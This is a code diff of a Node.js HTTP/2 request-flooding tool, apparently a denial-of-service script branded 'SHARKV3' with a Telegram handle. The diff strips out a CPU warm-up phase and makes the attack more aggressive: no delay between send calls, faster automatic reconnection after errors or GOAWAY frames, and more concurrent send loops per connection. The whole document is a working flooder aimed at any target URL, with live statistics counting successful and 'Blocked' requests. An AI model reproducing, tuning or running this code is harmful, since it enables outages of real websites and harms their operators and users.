@@ -1,5 +1,5 @@
 const http2 = require('http2');
-const { Worker, isMainThread, workerData, parentPort } = require('worker_threads');
+const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
@@ -9,7 +9,6 @@ const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
 const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 1100;
-const WARMUP_TIME = 5000; // 5 seconds full-throttle CPU warm-up
 
 let totalRequests = 0;
 let successCount = 0;
@@ -28,50 +27,23 @@ if (isMainThread) {
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`WARMING UP CPUS...`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-    let warmupDone = 0;
-    const totalWorkers = THREADS + THREADS * POWER_MULTIPLIER;
-
-    for (let i = 0; i < totalWorkers; i++) {
-        const worker = new Worker(__filename, { workerData: { warmup: true } });
-        worker.on('message', msg => {
-            if (msg === 'warmup-done') {
-                warmupDone++;
-                if (warmupDone === totalWorkers) startAttack();
-            }
-        });
+    
+    for (let i = 0; i < THREADS; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
 
-    function startAttack() {
-        console.clear();
-        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-        console.log(`SHARKV3! - FULL THROTTLE BEGUN`);
-
-        for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: true } });
-        }
-
-        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: false } });
-        }
-
-        setInterval(() => {
-            maxRps = Math.max(maxRps, rpsLastSecond);
-            renderStats();
-            rpsLastSecond = 0;
-        }, LIVE_REFRESH_RATE);
-
-        const server = net.createServer(socket => {
-            socket.on('data', data => {
-                const msg = data.toString();
-                if (msg === 'req') totalRequests++, rpsLastSecond++;
-                else if (msg === 'ok') successCount++;
-                else if (msg === 'err') errorCount++;
-            });
-        });
-        server.listen(9999);
+    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+        new Worker(__filename, { workerData: { target, duration, initial: false } });
     }
+
+    // Live Stats
+    setInterval(() => {
+        maxRps = Math.max(maxRps, rpsLastSecond);
+        renderStats();
+        rpsLastSecond = 0;
+    }, LIVE_REFRESH_RATE);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
@@ -84,14 +56,16 @@ if (isMainThread) {
         console.log(`succes: ${successCount}`);
         console.log(`Blocked: ${errorCount}`);
     }
-} else if (workerData.warmup) {
-    const end = Date.now() + WARMUP_TIME;
-    while (Date.now() < end) {
-        // Pure CPU load
-        let x = 0;
-        for (let i = 0; i < 1e6; i++) x += Math.sqrt(i * i);
-    }
-    parentPort.postMessage('warmup-done');
+
+    const server = net.createServer(socket => {
+        socket.on('data', data => {
+            const msg = data.toString();
+            if (msg === 'req') totalRequests++, rpsLastSecond++;
+            else if (msg === 'ok') successCount++;
+            else if (msg === 'err') errorCount++;
+        });
+    });
+    server.listen(9999);
 } else {
     const { target, duration, initial } = workerData;
     const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
@@ -103,7 +77,7 @@ if (isMainThread) {
     function sendLoop(client, inflight) {
         if (Date.now() > end || client.destroyed) return;
 
-        while (inflight.count < MAX_INFLIGHT) {
+        if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
                 const req = client.request({ ':method': 'GET', ':path': '/' });
@@ -126,7 +100,7 @@ if (isMainThread) {
             }
         }
 
-        setTimeout(() => sendLoop(client, inflight), 10);
+        setTimeout(() => sendLoop(client, inflight), 0); // no delay between calls
     }
 
     function createConnection() {
@@ -134,33 +108,27 @@ if (isMainThread) {
 
         let client;
         try {
-            client = http2.connect(target, {
-                maxSessionMemory: 32768,
-                settings: {
-                    enablePush: false,
-                    maxConcurrentStreams: 1000,
-                }
-            });
+            client = http2.connect(target);
 
             const inflight = { count: 0 };
 
             client.on('error', () => {
                 client.destroy();
-                setTimeout(createConnection, 200);
+                setTimeout(createConnection, 100); // auto-recover fast
             });
 
             client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 200));
+            client.on('close', () => setTimeout(createConnection, 100));
 
             client.on('connect', () => {
-                for (let i = 0; i < 100; i++) sendLoop(client, inflight);
+                for (let i = 0; i < 150; i++) sendLoop(client, inflight); // boosted request flow
             });
         } catch {
-            setTimeout(createConnection, 200);
+            setTimeout(createConnection, 100);
         }
     }
 
     for (let i = 0; i < connections; i++) {
-        setTimeout(createConnection, i * 10);
+        createConnection();
     }
 }
